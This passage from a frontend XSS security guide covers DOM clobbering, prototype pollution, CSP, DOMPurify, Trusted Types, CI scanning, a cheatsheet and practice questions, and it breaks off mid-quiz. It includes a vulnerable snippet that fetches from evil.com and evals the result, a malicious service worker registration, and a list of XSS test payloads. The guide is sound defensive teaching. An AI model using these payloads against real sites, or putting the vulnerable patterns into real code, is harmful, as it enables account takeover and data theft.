<!-- Vulnerable code: -->
<script>
  // Developer expected window.config to be undefined
  // But DOM clobbering made it point to the <a> element
  fetch(window.config?.href || "/api/config") // Fetches evil.com!
    .then(r => r.json())
    .then(eval); // If config is executable → XSS via clobber
</script>
```

**Defense:** Use `const` declarations, strict object access patterns, avoid global name lookups.

### Prototype Pollution → XSS

```javascript
// Prototype pollution (from query params, JSON merge, etc.)
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// If any library later does:
element[key] = value; // where key comes from polluted prototype
// Or if a template engine reads from prototype chain

// Defense: Object.create(null), Object.freeze(Object.prototype) in dev
```

### Service Worker Implications

```javascript
// If attacker achieves XSS once, they can install a persistent service worker:
navigator.serviceWorker.register("/evil-sw.js");

// evil-sw.js can:
// - Intercept ALL requests (steal credentials, modify responses)
// - Persist even after XSS is patched (SW stays installed)
// - Serve cached malicious content indefinitely
// - Exfiltrate data from every subsequent page load

// This is why CSP + XSS prevention is critical:
// One XSS → persistent compromise via service worker
```

### XSS Escalation Chain

```
Initial XSS (stored comment)
    │
    ├── Steal session cookie → Account takeover
    │
    ├── Read CSRF tokens → Perform any action as user
    │
    ├── Install service worker → Persistent access
    │
    ├── Modify DOM → Phishing (fake login form)
    │
    ├── Keylog → Capture credentials for other sites
    │
    ├── Access APIs → Exfiltrate sensitive data
    │
    ├── Target admin → Privilege escalation
    │
    └── Self-propagate → XSS worm (exponential spread)
```

---

## 8. Secure Architecture & Defense Strategy

### Defense-in-Depth Layers

```
┌──────────────────────────────────────────────────────────────┐
│              XSS Defense Layers                                │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Layer 1: Input Validation                                   │
│    - Reject unexpected input shapes                          │
│    - Validate types, lengths, formats                        │
│    - NOT a security boundary (defense-in-depth only)        │
│                                                                │
│  Layer 2: Context-Aware Output Encoding                      │
│    - HTML encode for HTML context                            │
│    - JS encode for JavaScript context                        │
│    - URL encode for URL context                              │
│    - Framework auto-escaping (React, Astro)                 │
│                                                                │
│  Layer 3: Sanitization (when HTML needed)                    │
│    - DOMPurify for rich text                                 │
│    - Allowlist approach                                      │
│    - Server-side + client-side                               │
│                                                                │
│  Layer 4: Content Security Policy                            │
│    - Strict nonce-based CSP                                  │
│    - Blocks inline scripts even if injected                  │
│    - Prevents eval, inline handlers                          │
│                                                                │
│  Layer 5: Trusted Types                                      │
│    - Prevents DOM XSS at the API level                      │
│    - Enforces sanitization at every sink                    │
│    - Runtime enforcement in browser                          │
│                                                                │
│  Layer 6: HTTPOnly Cookies + Secure Headers                  │
│    - Limits XSS impact (can't steal httpOnly cookies)       │
│    - X-Content-Type-Options: nosniff                        │
│    - X-Frame-Options: DENY                                  │
│                                                                │
│  Layer 7: Monitoring & Response                              │
│    - CSP reporting                                           │
│    - Anomaly detection                                       │
│    - Incident response playbook                              │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Secure Frontend Architecture for CMS-Driven Apps

```typescript
// Architecture: CMS → API → Frontend (with sanitization layer)

// Sanitization service (shared across frontend)
// lib/sanitize.ts
import DOMPurify from "isomorphic-dompurify";

const SAFE_CONFIG = {
  ALLOWED_TAGS: [
    "h1", "h2", "h3", "h4", "h5", "h6",
    "p", "br", "hr",
    "ul", "ol", "li",
    "a", "strong", "em", "b", "i", "u",
    "blockquote", "pre", "code",
    "table", "thead", "tbody", "tr", "th", "td",
    "img", "figure", "figcaption",
  ],
  ALLOWED_ATTR: ["href", "src", "alt", "title", "class", "target", "rel"],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ["target"],
  FORBID_TAGS: ["script", "style", "iframe", "object", "embed", "form", "input"],
  FORBID_ATTR: ["style", "onerror", "onload", "onclick", "onmouseover"],
};

export function sanitizeCMSContent(html: string): string {
  return DOMPurify.sanitize(html, SAFE_CONFIG);
}

export function sanitizeURL(url: string): string | null {
  try {
    const parsed = new URL(url);
    if (["http:", "https:"].includes(parsed.protocol)) {
      return parsed.toString();
    }
    return null;
  } catch {
    return null;
  }
}
```

### Multi-Tenant XSS Isolation

```
┌──────────────────────────────────────────────────────────────┐
│           Multi-Tenant Security Architecture                  │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Option 1: Subdomain isolation                               │
│    tenant-a.app.com / tenant-b.app.com                       │
│    + Different origins → XSS in A can't access B           │
│    - More infra complexity                                   │
│                                                                │
│  Option 2: Path-based (shared origin) ⚠️                    │
│    app.com/tenant-a / app.com/tenant-b                       │
│    - Same origin → XSS in A CAN access B's data            │
│    - MUST use iframe isolation or strict CSP                 │
│                                                                │
│  Option 3: Sandboxed iframes                                 │
│    Tenant content rendered in sandboxed iframe               │
│    <iframe sandbox="allow-scripts" src="/render/tenant-a">   │
│    + Script execution isolated from parent                   │
│    + No access to parent cookies/DOM                         │
│                                                                │
│  Recommendation: Subdomain isolation for true multi-tenant   │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Third-Party Script Governance

```typescript
// Secure third-party script loading

// 1. Subresource Integrity (SRI)
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>

// 2. Sandboxed iframe for untrusted widgets
<iframe
  src="https://widget.thirdparty.com/embed"
  sandbox="allow-scripts allow-same-origin"
  loading="lazy"
  referrerpolicy="no-referrer"
></iframe>

// 3. Web Worker isolation for risky computations
const worker = new Worker("/sandbox-worker.js");
worker.postMessage({ untrustedData }); // Can't access DOM

// 4. CSP to limit third-party script capabilities
// Content-Security-Policy: script-src 'nonce-xxx' https://trusted-cdn.com;
```

---

## 9. Setup Guide

### Complete XSS Defense Setup

#### Step 1: Security Headers (Next.js)

```typescript
// middleware.ts
import { NextResponse } from "next/server";
import crypto from "crypto";

export function middleware(request) {
  const nonce = crypto.randomBytes(16).toString("base64");
  
  const cspDirectives = [
    `default-src 'none'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic' https:`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' https: data:`,
    `font-src 'self' https:`,
    `connect-src 'self' ${process.env.NEXT_PUBLIC_API_URL}`,
    `frame-src 'none'`,
    `frame-ancestors 'none'`,
    `base-uri 'none'`,
    `form-action 'self'`,
    `upgrade-insecure-requests`,
    `require-trusted-types-for 'script'`,
  ].join("; ");
  
  const response = NextResponse.next();
  response.headers.set("Content-Security-Policy", cspDirectives);
  response.headers.set("X-Content-Type-Options", "nosniff");
  response.headers.set("X-Frame-Options", "DENY");
  response.headers.set("X-XSS-Protection", "0"); // Disable legacy, use CSP
  response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
  response.headers.set("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
  
  // Pass nonce to rendering context
  request.headers.set("x-nonce", nonce);
  return response;
}
```

#### Step 2: DOMPurify Integration

```typescript
// lib/sanitize.ts
import DOMPurify from "isomorphic-dompurify";

// Configure once, use everywhere
const purifyConfig: DOMPurify.Config = {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li",
                  "h1", "h2", "h3", "h4", "blockquote", "pre", "code", "img"],
  ALLOWED_ATTR: ["href", "src", "alt", "class"],
  FORBID_ATTR: ["style", "onerror", "onload"],
  ALLOW_DATA_ATTR: false,
};

export function sanitize(dirty: string): string {
  return DOMPurify.sanitize(dirty, purifyConfig);
}

// Strict: no HTML at all (just text)
export function escapeHTML(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}
```

#### Step 3: ESLint Security Rules

```json
// .eslintrc.json
{
  "plugins": ["react", "@typescript-eslint"],
  "rules": {
    "react/no-danger": "error",
    "react/no-danger-with-children": "error",
    "no-eval": "error",
    "no-implied-eval": "error",
    "no-new-func": "error",
    "no-script-url": "error"
  },
  "overrides": [
    {
      "files": ["**/components/SafeHTML.tsx"],
      "rules": {
        "react/no-danger": "off"
      }
    }
  ]
}
```

#### Step 4: Trusted Types Setup

```typescript
// trusted-types-init.ts (load early in app)
if (window.trustedTypes && trustedTypes.createPolicy) {
  // Default policy — last line of defense
  trustedTypes.createPolicy("default", {
    createHTML: (input) => {
      console.warn("Trusted Types violation — uncontrolled innerHTML:", input.substring(0, 100));
      // In production: report to monitoring, return sanitized
      return DOMPurify.sanitize(input);
    },
    createScriptURL: (input) => {
      const allowed = ["https://cdn.example.com/", "/static/"];
      if (allowed.some((prefix) => input.startsWith(prefix))) {
        return input;
      }
      throw new TypeError(`Blocked script URL: ${input}`);
    },
    createScript: () => {
      throw new TypeError("Script creation blocked");
    },
  });
}
```

#### Step 5: CI/CD Security Scanning

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/javascript
            p/typescript
            p/react
            p/xss
            p/owasp-top-ten
      
      - name: ESLint Security
        run: npx eslint --config .eslintrc.security.json src/

  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Snyk Security
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  csp-validation:
    runs-on: ubuntu-latest
    steps:
      - name: Validate CSP headers
        run: |
          # Start app and check CSP headers
          npm run build && npm run start &
          sleep 5
          CSP=$(curl -sI http://localhost:3000 | grep -i content-security-policy)
          echo "$CSP"
          # Ensure no unsafe-inline in script-src
          if echo "$CSP" | grep -q "unsafe-inline.*script"; then
            echo "ERROR: unsafe-inline in script-src!"
            exit 1
          fi
```

---

## 10. Security Tooling Comparison

| Tool | Type | XSS Relevance | Learning Curve | CI/CD | Enterprise |
|------|------|---------------|----------------|-------|------------|
| **DOMPurify** | Sanitization library | Direct (runtime defense) | Low | N/A | ✅ |
| **sanitize-html** | Sanitization library | Direct (server-side) | Low | N/A | ✅ |
| **Trusted Types** | Browser API | Direct (DOM XSS prevention) | Medium | N/A | ✅ |
| **CSP** | Browser policy | Direct (execution prevention) | Medium-High | ✅ | ✅ |
| **eslint-plugin-security** | SAST (lint) | Finds dangerous patterns | Low | ✅ | ✅ |
| **Semgrep** | SAST (patterns) | Custom XSS rules | Medium | ✅ | ✅ |
| **Snyk** | SCA + SAST | Vulnerable deps | Low | ✅ | ✅ |
| **OWASP ZAP** | DAST (scanner) | Finds reflected/stored XSS | Medium | ✅ | ✅ |
| **Burp Suite** | Penetration testing | Manual XSS discovery | High | ❌ | ✅ (Pro) |
| **npm audit** | SCA | Vulnerable deps | Low | ✅ | ❌ (basic) |
| **Dependabot** | SCA (GitHub) | Auto-updates vulnerable deps | Low | ✅ | ✅ |

### Recommended Stack for React/Next.js/Astro

```
Runtime Defense:    DOMPurify + Trusted Types + CSP
Lint:               eslint-plugin-security + no-danger rules
SAST:               Semgrep with XSS rules
SCA:                Snyk + Dependabot
DAST:               OWASP ZAP in CI pipeline
Manual Testing:     Burp Suite for penetration testing
Monitoring:         CSP reporting endpoint → alerting
```

---

## 11. Cheatsheet

### Dangerous DOM Sinks (Never use with user input)

| Sink | Context | Alternative |
|------|---------|-------------|
| `innerHTML` | HTML | `textContent` or DOMPurify |
| `outerHTML` | HTML | `textContent` + createElement |
| `document.write()` | HTML | DOM APIs |
| `insertAdjacentHTML()` | HTML | `insertAdjacentText()` |
| `eval()` | JS | JSON.parse, direct logic |
| `setTimeout(string)` | JS | `setTimeout(function)` |
| `new Function(string)` | JS | Direct function definition |
| `element.src` | URL | Validate protocol |
| `element.href` | URL | Validate protocol |
| `location.href = input` | URL | Validate with URL() |
| `jQuery.html()` | HTML | `jQuery.text()` |
| `v-html` (Vue) | HTML | `{{ }}` interpolation |
| `[innerHTML]` (Angular) | HTML | `{{ }}` interpolation |
| `dangerouslySetInnerHTML` | HTML | Normal JSX `{}` |
| `set:html` (Astro) | HTML | Normal `{}` |

### Context Encoding Quick Reference

| Context | Encode | Example |
|---------|--------|---------|
| HTML body | `&lt; &gt; &amp; &quot; &#x27;` | `<div>{encoded}</div>` |
| HTML attribute (quoted) | Same as HTML body | `<div title="{encoded}">` |
| JavaScript string | `\xHH` escape | `var x = "\x3cscript\x3e";` |
| URL parameter | `encodeURIComponent()` | `?q=${encoded}` |
| CSS value | `\HH ` (hex + space) | `content: "\3c "` |

### CSP Quick Reference

```http
# Strict CSP (copy-paste starting point)
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' https: data:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'none';
  form-action 'self';
  require-trusted-types-for 'script';
```

### Safe React Patterns

```tsx
// ✅ Always safe
<div>{userInput}</div>
<img alt={userInput} />
<a href={validatedUrl}>{linkText}</a>

// ⚠️ Requires sanitization
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

// ❌ Never do
<div dangerouslySetInnerHTML={{ __html: userInput }} />
<a href={userInput}>Link</a>  // without URL validation
ref.current.innerHTML = userInput;
```

### Common XSS Payloads (For Testing)

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Attribute breakout -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- URL-based -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- Encoding bypasses -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061lert(1)>

<!-- Template literal -->
${alert(1)}

<!-- SVG -->
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>
```

---

## 12. Real-World Engineering Mindset

### Rich Text Editors

**Problem:** Users need to create formatted content (bold, links, images) — this requires HTML rendering.

**Strategies:**

| Strategy | How | Pros | Cons | Best for |
|----------|-----|------|------|----------|
| Markdown only | Convert MD → sanitized HTML | Simple, safe | Limited formatting | Dev tools, comments |
| Structured format | ProseMirror/Tiptap JSON → HTML | Full control | Complex | CMS, editors |
| Sanitized HTML | DOMPurify on output | Works with any editor | Parser differential risk | Legacy systems |
| Iframe sandbox | Render untrusted in sandbox | Full isolation | Complex UX | User-generated sites |

**What a senior security engineer would choose:**
- Structured editor (Tiptap/ProseMirror) that outputs a controlled JSON schema
- Convert schema to HTML server-side with strict serializer
- Never store raw HTML from client
- DOMPurify as defense-in-depth on rendering
- CSP as final safety net

### Markdown Rendering

**Problem:** Markdown renderers may allow raw HTML injection.

```typescript
// ❌ Unsafe: allows HTML in Markdown
import { marked } from "marked";
const html = marked(userMarkdown); // May contain <script>!

// ✅ Safe: disable HTML or sanitize
import { marked } from "marked";
marked.setOptions({ sanitize: false }); // Don't rely on deprecated sanitize
const html = DOMPurify.sanitize(marked(userMarkdown));

// ✅ Best: Use remark/rehype with sanitize plugin
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkRehype from "remark-rehype";
import rehypeSanitize from "rehype-sanitize";
import rehypeStringify from "rehype-stringify";

const result = await unified()
  .use(remarkParse)
  .use(remarkRehype)
  .use(rehypeSanitize) // Strict sanitization
  .use(rehypeStringify)
  .process(userMarkdown);
```

### Multi-Tenant SaaS

**Problem:** Tenant A's XSS shouldn't compromise Tenant B.

**Strategy:**
1. **Origin isolation:** Different subdomains per tenant (strongest)
2. **Strict CSP:** Even if XSS occurs, limit what it can do
3. **Sanitize all tenant-provided content:** Theme customization, custom fields
4. **Sandboxed iframe rendering:** For custom HTML/widgets
5. **API-level tenant isolation:** Tokens scoped to tenant, not user across tenants

### Third-Party Embeds (Analytics, Chat, Marketing)

**Problem:** Third-party scripts have full origin access.

**Strategy:**
- Load in sandboxed iframe when possible
- Use SRI (Subresource Integrity) for CDN-loaded scripts
- CSP restricts which domains can serve scripts
- Monitor for script changes (hash monitoring)
- Vendor security assessment
- Incident response: ability to kill third-party scripts instantly

```typescript
// Kill switch for third-party scripts
// Feature flag to disable compromised vendor
if (!featureFlags.enableVendorX) {
  // Don't load vendor X's script
}
```

---

## 13. Brainstorm / Open Questions

### Browser Parsing (15 questions)
1. What parsing context does user input enter in this template?
2. How does the HTML parser handle malformed tags?
3. What happens when `<script>` appears inside `<textarea>`?
4. Why does innerHTML behave differently than DOMParser?
5. How do parser error recovery rules create XSS opportunities?
6. What's the difference between HTML parsing and XML parsing for SVG?
7. How does the browser handle character encoding in different contexts?
8. Why might a sanitizer's parse tree differ from the browser's?
9. How does `<template>` element parsing differ from normal elements?
10. What happens to event handlers during DOM cloning?
11. How does the browser decide when to execute inline scripts during parsing?
12. What's the role of the "foster parenting" algorithm in mXSS?
13. How do custom elements affect parsing and XSS surface?
14. What happens when you set innerHTML on a `<template>` vs a `<div>`?
15. How does the parser handle null bytes in different contexts?

### Sanitization (15 questions)
16. Should this content be sanitized or escaped?
17. What's the attack surface of allowing `<a>` tags with href?
18. How could a CSS `url()` value lead to data exfiltration?
19. Why might DOMPurify's output still be dangerous in certain contexts?
20. What's the security implication of `data:` URLs in allowed attributes?
21. How should SVG sanitization differ from HTML sanitization?
22. What happens if sanitization occurs before encoding vs after?
23. How do you safely allow user-defined CSS class names?
24. What's the risk of allowing `style` attributes even with sanitization?
25. How should you sanitize Markdown that contains HTML?
26. What's the mutation XSS risk in this sanitizer configuration?
27. How does character encoding affect sanitization effectiveness?
28. Should sanitization happen on input or output?
29. What's the risk of client-only sanitization without server-side validation?
30. How should you handle user-provided URLs in `<img>` tags?

### Rendering Architecture (15 questions)
31. How does this component's rendering pipeline handle untrusted data?
32. Could hydration create a new attack surface for this content?
33. What happens if the CDN serves stale HTML with injected content?
34. How does streaming SSR affect XSS defense?
35. What's the security boundary between server components and client components?
36. How should a design system ensure XSS-safe component APIs?
37. Should this rich text be rendered server-side or client-side?
38. What's the trust boundary between the CMS and the frontend?
39. How does lazy loading/code splitting affect CSP nonce delivery?
40. What's the XSS risk of dynamic import() with user-controlled paths?
41. How should error boundaries handle potentially malicious content?
42. What's the attack surface of user-customizable themes?
43. How does island architecture (Astro) affect XSS isolation?
44. What happens if a React portal renders user content outside the root?
45. How should micro-frontends handle XSS across boundaries?

### CSP (15 questions)
46. Why might this CSP configuration still allow XSS?
47. How does `strict-dynamic` change trust propagation?
48. What's the risk of `unsafe-inline` in style-src?
49. How should CSP handle dynamically created scripts?
50. What are the CSP implications of Web Workers?
51. How does CSP interact with service workers?
52. What's the correct CSP for a Next.js app with dynamic imports?
53. How should CSP reporting be structured at scale?
54. What CSP bypasses exist for common configurations?
55. How does base-uri restriction prevent XSS escalation?
56. What's the deployment strategy for CSP across 100+ microservices?
57. How do you handle CSP for third-party OAuth redirects?
58. What's the relationship between frame-ancestors and XFO?
59. How should CSP differ between development and production?
60. What happens when CSP blocks a critical third-party script?

### Trusted Types (15 questions)
61. How does Trusted Types enforcement affect existing libraries?
62. What's the migration strategy from no Trusted Types to full enforcement?
63. How should the default policy behave in development vs production?
64. What sinks does Trusted Types not cover?
65. How do Trusted Types interact with Web Components?
66. What's the performance impact of Trusted Types policies?
67. How should multiple teams share Trusted Types policies?
68. What's the right granularity for Trusted Types policies?
69. How does Trusted Types affect SSR hydration?
70. What happens when a third-party library violates Trusted Types?
71. How should Trusted Types violations be monitored?
72. Can Trusted Types be bypassed? Under what conditions?
73. How does Trusted Types interact with CSP?
74. What's the developer experience impact of Trusted Types?
75. How should testing handle Trusted Types enforcement?

### SSR Security (15 questions)
76. What's the injection risk when interpolating user data in SSR HTML?
77. How does React Server Components change the XSS threat model?
78. What happens if cached SSR output is poisoned with XSS?
79. How should SSR handle user data in `<script>` tags (JSON data)?
80. What's the XSS risk of streaming HTML with user content?
81. How does edge rendering affect sanitization strategy?
82. What's the security difference between SSG and SSR for XSS?
83. How should error messages in SSR avoid reflecting user input?
84. What's the XSS risk of Server Actions that return HTML?
85. How does partial prerendering affect CSP nonce delivery?
86. What's the security impact of React's suppressHydrationWarning?
87. How should meta tags with user data be handled in SSR?
88. What's the XSS risk of dynamic og:image generation?
89. How does ISR cache invalidation affect stored XSS?
90. What's the security model for Astro's content collections?

### Framework Security (15 questions)
91. Is React's escaping sufficient for all contexts?
92. What Vue directives are XSS-dangerous?
93. How does Angular's DomSanitizer compare to DOMPurify?
94. What's the XSS surface of Next.js' Image component?
95. How do React hooks create new potential XSS patterns?
96. What's the security implication of using `eval` in bundlers?
97. How should state management handle potentially malicious data?
98. What's the XSS risk of browser extension content scripts?
99. How do framework devtools create XSS surface in development?
100. What's the security model of Remix's loader/action pattern?

### Third-Party Risks (10 questions)
101. How do you assess XSS risk of a third-party component library?
102. What's your process when a dependency has an XSS vulnerability?
103. How should A/B testing scripts be secured against XSS?
104. What's the supply chain risk of compromised npm packages?
105. How do you audit third-party scripts for malicious behavior?
106. What's the risk of loading scripts from shared CDNs?
107. How should third-party auth widgets be isolated?
108. What monitoring detects compromised third-party scripts?
109. How do you handle XSS in third-party Markdown renderers?
110. What's the security model for browser extension communication?

### Enterprise AppSec (15 questions)
111. How should XSS governance work across 50+ frontend apps?
112. What metrics should frontend security teams track?
113. How should XSS findings be prioritized in bug bounty programs?
114. What's the organizational model for CSP ownership?
115. How should security reviews evaluate new UI components?
116. What's the migration strategy for legacy apps with inline scripts?
117. How should frontend security training be structured?
118. What's the incident response plan for a stored XSS worm?
119. How do you balance developer velocity with security controls?
120. What automated checks should run on every PR?
121. How should design systems enforce security by default?
122. What's the cost-benefit of Trusted Types rollout?
123. How should shared component libraries handle XSS responsibility?
124. What's the security review process for custom Markdown extensions?
125. How should frontend observability detect XSS exploitation?

---

## 14. Practice Questions

### Beginner (35 questions)

**Q1.** What does XSS stand for?
- **Type:** Fill in the blank
- **Answer:** Cross-Site Scripting
- **Why:** The "X" avoids confusion with CSS (Cascading Style Sheets).

**Q2.** True or False: XSS requires the attacker to have direct access to the server.
- **Type:** True/False
- **Answer:** False
- **Why:** XSS exploits the application's handling of user input. The attacker injects code through normal application interfaces (forms, URLs, APIs).

**Q3.** Which type of XSS is stored permanently on the target server?
- A) Reflected XSS
- B) Stored XSS
- C) DOM-based XSS
- D) Self-XSS
- **Type:** Single choice
- **Answer:** B) Stored XSS
- **Why:** Stored (persistent) XSS saves the payload in the database/server and executes for every user who views the affected content.

**Q4.** What DOM property safely displays user text without executing HTML?
- A) innerHTML
- B) textContent
- C) outerHTML
- D) document.write
- **Type:** Single choice
- **Answer:** B) textContent
- **Why:** textContent treats everything as plain text — no HTML parsing occurs. innerHTML parses content as HTML, enabling XSS.

**Q5.** True or False: The `<img>` tag can execute JavaScript.
- **Type:** True/False
- **Answer:** True
- **Why:** `<img src=x onerror="alert(1)">` — the onerror event handler executes when the image fails to load.

**Q6.** What characters should be HTML-encoded to prevent XSS in HTML body context?
- **Type:** Short answer
- **Answer:** `<`, `>`, `&`, `"`, `'` (encoded as `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`)

**Q7.** Which of these is a reflected XSS attack?
- A) Malicious script stored in a database comment
- B) Malicious script in a URL parameter reflected in the response
- C) Client-side JavaScript reading from location.hash
- D) XSS via a compromised NPM package
- **Type:** Single choice
- **Answer:** B)
- **Why:** Reflected XSS: input from the request is immediately reflected in the response without storage.

**Q8.** True or False: Modern browsers' built-in XSS filters (X-XSS-Protection) are sufficient protection.
- **Type:** True/False
- **Answer:** False
- **Why:** Browser XSS auditors have been removed (Chrome removed in 2019) because they were bypassable and caused new vulnerabilities. Use CSP instead.

**Q9.** What makes `javascript:alert(1)` dangerous when used as an href value?
- **Type:** Short answer
- **Answer:** The `javascript:` URL scheme tells the browser to execute the following string as JavaScript when the link is clicked. If user-controlled data can set href attributes, this creates XSS.

**Q10.** Which HTTP header helps prevent XSS by controlling what scripts can execute?
- A) X-Content-Type-Options
- B) Content-Security-Policy
- C) X-Frame-Options
- D) Strict-Transport-Security
- **Type:** Single choice
- **Answer:** B) Content-Security-Policy
- **Why:** CSP allows you to specify which scripts are allowed to execute, blocking injected scripts that lack valid nonces or hashes.

**Q11.** True or False: XSS can only steal cookies.
- **Type:** True/False
- **Answer:** False
- **Why:** XSS gives full access to the origin: DOM manipulation, API calls, keylogging, credential theft, service worker installation, and more. Cookie theft is just one possible exploitation.

**Q12.** What's the difference between `innerHTML` and `textContent`?
- **Type:** Short answer
- **Answer:** `innerHTML` parses the assigned string as HTML (can execute scripts via event handlers). `textContent` treats everything as plain text — no parsing, no execution, completely safe for user input.

**Q13.** Which HTML element's content is NOT parsed as HTML by the browser?
- A) `<div>`
- B) `<textarea>`
- C) `<p>`
- D) `<span>`
- **Type:** Single choice
- **Answer:** B) `<textarea>`
- **Why:** `<textarea>` is a raw text element — its content is treated as plain text by the parser, not HTML. However, the content still needs encoding when rendered inside `<textarea>`.

**Q14.** What is "DOM-based XSS"?
- **Type:** Short answer
- **Answer:** XSS where the vulnerability exists entirely in client-side JavaScript. User input (from URL, storage, etc.) flows into a dangerous DOM API (sink) without the server ever processing it.

**Q15.** True or False: Escaping HTML special characters (`< > & " '`) prevents XSS in all contexts.
- **Type:** True/False
- **Answer:** False
- **Why:** HTML escaping only prevents XSS in HTML body and quoted attribute contexts. JavaScript context, URL context, and CSS context each require different encoding.

**Q16-Q35:** *(Additional beginner questions covering basic payloads, safe vs unsafe APIs, cookie theft, encoding, and input sources)*

**Q16.** What attribute of a cookie prevents JavaScript from accessing it?
- **Answer:** `HttpOnly`
- **Why:** HttpOnly cookies can't be read via `document.cookie`, limiting (but not eliminating) XSS impact.

**Q17.** True or False: A `<form>` tag can be injected via XSS to phish credentials.
- **Answer:** True — XSS can inject a fake login form that submits to an attacker's server, all within the trusted domain.

**Q18.** What is the OWASP ranking of XSS in the latest Top 10?
- **Answer:** Injection (which includes XSS) is consistently in the Top 10. As of OWASP 2021, it falls under "A03:2021 – Injection."

---

### Junior (35 questions)

**Q36.** Your React app has `<div dangerouslySetInnerHTML={{ __html: comment.body }} />`. What's the risk?
- **Type:** Scenario-based
- **Answer:** If `comment.body` contains user-generated HTML that hasn't been sanitized, any script or event handler will execute — stored XSS. Must sanitize with DOMPurify before rendering.

**Q37.** True or False: React automatically prevents all XSS attacks.
- **Type:** True/False
- **Answer:** False
- **Why:** React auto-escapes JSX interpolation (`{value}`) which prevents most XSS. But `dangerouslySetInnerHTML`, `href` with `javascript:`, `ref.current.innerHTML`, and SSR injection remain vulnerable.

**Q38.** What's wrong with this sanitization?
```javascript
const clean = input.replace(/<script>/gi, "").replace(/<\/script>/gi, "");
```
- **Type:** Debugging
- **Answer:** Only removes `<script>` tags. Bypasses: `<img onerror=alert(1)>`, `<svg onload=alert(1)>`, `<body onload=alert(1)>`, nested tags `<scrscriptipt>`, and hundreds of other vectors that don't use `<script>`.

**Q39.** What is the CSP directive that blocks inline scripts?
- **Type:** Short answer
- **Answer:** `script-src` without `'unsafe-inline'`. When you specify `script-src 'nonce-xxx'` or `script-src 'sha256-xxx'`, inline scripts without matching nonces/hashes are blocked.

**Q40.** How does `strict-dynamic` work in CSP?
- **Type:** Short answer
- **Answer:** `strict-dynamic` means: "Trust any script loaded by an already-trusted script." If a nonced script dynamically creates another `<script>` element, the child script is trusted regardless of its source. This makes CSP compatible with module loaders and dynamic imports.

**Q41.** What's the DOM XSS vulnerability in this code?
```javascript
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = `Hello, ${name}!`;
```
- **Type:** Debugging
- **Answer:** URL parameter `name` flows directly into `innerHTML` without encoding. Attack: `?name=<img src=x onerror=alert(document.cookie)>`. Fix: use `textContent` instead.

**Q42.** True or False: `Content-Type: application/json` responses can cause XSS.
- **Type:** True/False
- **Answer:** Generally False (in modern browsers), but True in edge cases — if a browser sniffs content as HTML despite the header (older browsers), or if the JSON is loaded into an HTML context. This is why `X-Content-Type-Options: nosniff` is important.

**Q43.** What's the purpose of DOMPurify's `RETURN_DOM_FRAGMENT` option?
- **Type:** Short answer
- **Answer:** Returns a DocumentFragment instead of a string. This avoids re-parsing the HTML string (which could cause mutations) and provides a safe DOM structure directly.

**Q44.** Your Next.js app has a search page that displays `You searched for: ${query}`. Where should encoding happen?
- **Type:** Scenario-based
- **Answer:** In Next.js with React, using `<p>You searched for: {query}</p>` in JSX automatically encodes it. But if using `getServerSideProps` and embedding in a `<script>` tag for hydration data, you must JSON-serialize safely (`JSON.stringify` + entity encoding of `</script>` and `<!--`).

**Q45.** What's the risk of `<a href={userUrl}>Click</a>` in React?
- **Type:** Scenario-based
- **Answer:** React does NOT sanitize `href` values. If `userUrl` is `javascript:alert(document.cookie)`, clicking the link executes JavaScript. Must validate URL protocol (only allow http/https/mailto).

---

### Senior (35 questions)

**Q71.** Design a CSP strategy for a Next.js App Router application that uses third-party analytics, a CMS-driven blog, and user-generated content.
- **Type:** Architecture challenge
- **Answer:** Use nonce-based CSP generated per request in middleware. For analytics: load via nonced script that dynamically loads vendors (strict-dynamic propagates trust). CMS content: sanitize server-side with DOMPurify before rendering. User content: render in sandboxed iframe or sanitize strictly. Style: `'self' 'nonce-xxx'` with CSS-in-JS nonce support. Report violations to monitoring endpoint. Deploy in report-only first, analyze violations, then enforce.

**Q72.** A stored XSS worm is spreading through your platform's comments. What's your incident response?
- **Type:** Incident response
- **Answer:** 1) Immediately disable comment rendering (feature flag), 2) Identify the payload and affected records, 3) Sanitize all stored comments in database, 4) Identify compromised accounts (check for password/email changes), 5) Rotate affected sessions, 6) Deploy fix (sanitization on output), 7) Enable CSP to prevent re-exploitation, 8) Post-incident: add SAST rules, update security review process, 9) Notification to affected users.

**Q73.** True or False: Trusted Types completely eliminates DOM XSS.
- **Type:** True/False
